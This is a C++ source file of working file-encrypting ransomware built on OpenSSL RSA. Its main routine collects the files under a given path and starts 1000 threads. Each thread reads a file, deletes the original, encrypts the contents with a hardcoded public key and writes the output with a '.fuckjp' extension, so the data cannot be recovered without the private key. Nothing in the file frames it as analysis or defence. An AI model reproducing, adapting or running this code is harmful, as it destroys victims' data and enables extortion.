#include <openssl/pem.h>
#include <openssl/ssl.h>
#include <openssl/rsa.h>
#include <openssl/evp.h>
#include <openssl/bio.h>
#include <openssl/err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <fstream>
#include <sstream>
#include <iostream>
#include <vector>
#include <fstream>
#include <unistd.h>
#include <pthread.h>
#include <semaphore.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <queue>

#include "foreach.h"
#include "foreach.cpp"

pthread_mutex_t mutex_x = PTHREAD_MUTEX_INITIALIZER;

sem_t sem;
queue<string> wok_file_list;

#define KEY_LENGTH 2048           // 密钥长度
#define PUB_KEY_FILE "pubkey.pem" // 公钥路径
#define PRI_KEY_FILE "prikey.pem" // 私钥路径

using namespace std;

int padding = RSA_PKCS1_PADDING;

static string pub_key = R"(-----BEGIN PUBLIC KEY-----
MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKCAQEAtycpDMtjsaDFD8spoHrK
AVbyOnt1xxzrW+Dn8xZLY6N9wwFonZ1gg5Sd5CQMceEn4ZdXmR54js2aKU+0MWGn
TB/98n/O22BCXpUVfhK3u1s8bq/R/h6uPtOiFw6xJPMUEGH08gY5mk5BUO79PTcN
lN4jXNkqPieyPns5nHaPJsZy+DVryyQ2WIrJM2Rt6GRsQKOUwNY4vVJpn2ppKpHM
qn3mpI9yg6GC6QlCZqt2xNXuFvtNWwHls0XanangSL0zTc6SCUYCPAhItewIZeZ7
VaXcejjiOWYLYRPsQyJbFYm1C0VlFdfBlowoSObh6k4m7tUOs+yqTMe2dIkqMIZW
6QIBAw==
-----END PUBLIC KEY-----
)";
static string pri_key;

// 从文件读入到string里
string readFileIntoString(const string filename)
{
    ifstream ifile(filename);
    // 将文件读入到ostringstream对象buf中
    ostringstream buf;
    char ch;
    while (buf && ifile.get(ch))
    {
        // printf("4444444:%c\n", ch);s
        buf.put(ch);
    }

    // 返回与流对象buf关联的字符串
    return buf.str();
}

bool exists_test0(const string &name)
{
    if (FILE *file = fopen(name.c_str(), "r"))
    {
        fclose(file);
        return true;
    }
    else
    {
        return false;
    }
}

/*
制造密钥对：私钥和公钥
**/
void GenerateRSAKey(string &out_pub_key, string &out_pri_key)
{

    if (exists_test0(PRI_KEY_FILE) && exists_test0(PUB_KEY_FILE))
    {
        out_pub_key = readFileIntoString(PUB_KEY_FILE);
        out_pri_key = readFileIntoString(PRI_KEY_FILE);
        return;
    }

    size_t pri_len = 0;      // 私钥长度
    size_t pub_len = 0;      // 公钥长度
    char *pri_key = nullptr; // 私钥
    char *pub_key = nullptr; // 公钥

    // 生成密钥对
    RSA *keypair = RSA_generate_key(KEY_LENGTH, RSA_3, NULL, NULL);

    BIO *pri = BIO_new(BIO_s_mem());
    BIO *pub = BIO_new(BIO_s_mem());

    // 生成私钥
    PEM_write_bio_RSAPrivateKey(pri, keypair, NULL, NULL, 0, NULL, NULL);
    // 注意------生成第1种格式的公钥
    // PEM_write_bio_RSAPublicKey(pub, keypair);
    // 注意------生成第2种格式的公钥（此处代码中使用这种）
    PEM_write_bio_RSA_PUBKEY(pub, keypair);

    // 获取长度
    pri_len = BIO_pending(pri);
    pub_len = BIO_pending(pub);

    // 密钥对读取到字符串
    pri_key = (char *)malloc(pri_len + 1);
    pub_key = (char *)malloc(pub_len + 1);

    BIO_read(pri, pri_key, pri_len);
    BIO_read(pub, pub_key, pub_len);

    pri_key[pri_len] = '\0';
    pub_key[pub_len] = '\0';

    out_pub_key = pub_key;
    out_pri_key = pri_key;

    // 将公钥写入文件
    ofstream pub_file(PUB_KEY_FILE, ios::out);
    if (!pub_file.is_open())
    {
        perror("pub key file open fail:");
        return;
    }
    pub_file << pub_key;
    pub_file.close();

    // 将私钥写入文件
    ofstream pri_file(PRI_KEY_FILE, ios::out);
    if (!pri_file.is_open())
    {
        perror("pri key file open fail:");
        return;
    }
    pri_file << pri_key;
    pri_file.close();

    // 释放内存
    RSA_free(keypair);
    BIO_free_all(pub);
    BIO_free_all(pri);

    free(pri_key);
    free(pub_key);
}

/*
@brief : 公钥加密
@para  : clear_text  -[i] 需要进行加密的明文
         pri_key     -[i] 私钥
@return: 加密后的数据
**/
string RsaPubEncrypt(const string &clear_text, const string &pub_key)
{
    // printf("start\t%s\t\n", clear_text.c_str());
    string encrypt_text;
    BIO *keybio = BIO_new_mem_buf((unsigned char *)pub_key.c_str(), -1);
    RSA *rsa = RSA_new();
    // 注意-----第1种格式的公钥
    // rsa = PEM_read_bio_RSAPublicKey(keybio, &rsa, NULL, NULL);
    // 注意-----第2种格式的公钥（这里以第二种格式为例）
    rsa = PEM_read_bio_RSA_PUBKEY(keybio, &rsa, NULL, NULL);
    if (rsa == nullptr)
    {
        BIO_free_all(keybio);
        return "";
    }

    // 获取RSA单次可以处理的数据块的最大长度
    int key_len = RSA_size(rsa);
    int block_len = key_len - 11; // 因为填充方式为RSA_PKCS1_PADDING, 所以要在key_len基础上减去11

    // 申请内存：存贮加密后的密文数据
    char *sub_text = new char[key_len + 1];
    memset(sub_text, 0, key_len + 1);
    int ret = 0;
    int pos = 0;
    string sub_str;
    // 对数据进行分段加密（返回值是加密后数据的长度）
    while (pos < clear_text.length())
    {
        sub_str = clear_text.substr(pos, block_len);
        memset(sub_text, 0, key_len + 1);
        ret = RSA_public_encrypt(sub_str.length(), (const unsigned char *)sub_str.c_str(), (unsigned char *)sub_text, rsa, RSA_PKCS1_PADDING);
        if (ret >= 0)
        {
            // printf("%s\n", sub_text);
            encrypt_text.append(string(sub_text, ret));
            // printf("append:\t%s\n\n\n", encrypt_text.c_str());
            // printf("append end %d\n", encrypt_text.size());
            // printf("enc append: %d\n", encrypt_text.size());
        }
        pos += block_len;
    }

    // 释放内存
    BIO_free_all(keybio);
    RSA_free(rsa);

    delete[] sub_text;

    // printf(" 222%s\n", encrypt_text.c_str());
    // printf("fuckyou \n");
    // printf("%d\n" , encrypt_text.size());
    // printf("endfunc:\t%d\n", encrypt_text.size());
    return encrypt_text;
}

/*
@brief : 私钥解密
@para  : cipher_text -[i] 加密的密文
         pub_key     -[i] 公钥
@return: 解密后的数据
**/
string RsaPriDecrypt(const string &cipher_text, const string &pri_key)
{
    string decrypt_text;
    RSA *rsa = RSA_new();
    BIO *keybio;
    keybio = BIO_new_mem_buf((unsigned char *)pri_key.c_str(), -1);

    rsa = PEM_read_bio_RSAPrivateKey(keybio, &rsa, NULL, NULL);
    if (rsa == nullptr)
    {
        unsigned long err = ERR_get_error(); // 获取错误号
        char err_msg[1024] = {0};
        ERR_error_string(err, err_msg); // 格式：error:errId:库:函数:原因
        printf("err msg: err:%ld, msg:%s\n", err, err_msg);
        return string();
    }

    // 获取RSA单次处理的最大长度
    int key_len = RSA_size(rsa);
    char *sub_text = new char[key_len + 1];
    memset(sub_text, 0, key_len + 1);
    int ret = 0;
    string sub_str;
    int pos = 0;
    // 对密文进行分段解密
    while (pos < cipher_text.length())
    {
        sub_str = cipher_text.substr(pos, key_len);
        memset(sub_text, 0, key_len + 1);
        ret = RSA_private_decrypt(sub_str.length(), (const unsigned char *)sub_str.c_str(), (unsigned char *)sub_text, rsa, RSA_PKCS1_PADDING);
        if (ret >= 0)
        {
            decrypt_text.append(string(sub_text, ret));
            printf("pos:%d, sub: %s\n", pos, sub_text);
            pos += key_len;
        }
    }
    // 释放内存
    delete[] sub_text;
    BIO_free_all(keybio);
    RSA_free(rsa);

    return decrypt_text;
}

bool isFileExists_ifstream(string & name) {
    ifstream f(name.c_str());
    return f.good();
}

void *encOne(void *arg)
{
    try
    {
        // char *filename = (char *)arg;
        string filename;
        // char filename[1024];
        pthread_mutex_lock(&mutex_x);
        // strcpy(filename, wok_file_list.front().c_str());
        filename = wok_file_list.front();
        string  fuckjp_fname = filename + ".fuckjp";
        wok_file_list.pop();
        pthread_mutex_unlock(&mutex_x);
        
        if(isFileExists_ifstream(fuckjp_fname)){
            return arg;
        }

        // if(!endsWith(filename, ".h")) {
        //     return arg;
        // }

        string src_text;
        string encrypt_text;
        string decrypt_text;
        
        // GenerateRSAKey(pub_key, pri_key);
        //     if (pub_key.size() == 0)
        //     {
        //         pub_key = R"(-----BEGIN PUBLIC KEY-----
        // MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKCAQEA2+3Ub1RoiZKJqBbctzbS
        // 2WfnMcgp/NyLakOPgWU58neWh2s8XT3weSWqgUZVEmnSM5Qz+6T4KFzbN6qBJerO
        // v/PgF6sPFHBSR45r4XTWtH+3xoUlaebne6xKtX1LHEfEh6P+jJpnZd7e3KGhH6Cp
        // keGLzH0I+ydIyrQ/YeWN+b6n+Xu52zVD2qrYqnHfh2kD4sUz0wG79pT0RliW7DTN
        // 4DANUpqQy3Qg7pU7rQpEfoK/qYFW/giAzwZbpYZeD7NFVIOUFaIH23XUAOKicB14
        // tzydGUsVWYTm2EvvbuvVU4QVMXgh+dKQfohq7IJwhRbPoVFsp9ScejcqgZUcOAkf
        // qQIBAw==
        // -----END PUBLIC KEY-----
        // )";
        //     }
        //     if (pri_key.size() == 0)
        //     {
        //         pri_key = readFileIntoString(PRI_KEY_FILE);
        //     }
        src_text = readFileIntoString(filename);
        remove(filename.c_str());
        cout << "start:" << filename << endl;
        encrypt_text = RsaPubEncrypt(src_text, pub_key);
        cout << "end:" << filename << endl;
        ofstream outfile;
        string enc_filename = filename + ".fuckjp";
        // char *enc_filename;
        // enc_filename = strcat(filename, ".2111");
        outfile.open(enc_filename);
        outfile << encrypt_text;
        outfile.close();
    }
    catch (...)
    {
        cout << "未知异常" << endl;
    }
    return arg;
}

int main(int argc, char *argv[])
{
    // sem_init(&sem, 0, 2);
    if(argc < 2) {
        cout << "argc < 2" << endl;
        exit(0);
    }
    char *path = argv[1];
    getAbsoluteFilesBySuffix(path, wok_file_list);
    cout << "filename list size:\t" << wok_file_list.size() << endl;
    int thread_num = 1000;
    pthread_t thread_list[thread_num];
    int i, j, iRet;
    for (i = 0; i < thread_num; i++)
    {
        iRet = pthread_create(
            &thread_list[i],
            NULL,
            encOne,
            NULL);

        if (iRet)
        {
            perror("pthread create");
            return iRet;
        }
        else
        {
        }
    }

    for (j = 0; j < thread_num; j++)
    {
        pthread_join(thread_list[j],
                     NULL);
    }

    // sem_destroy(&sem);

    return 0;
}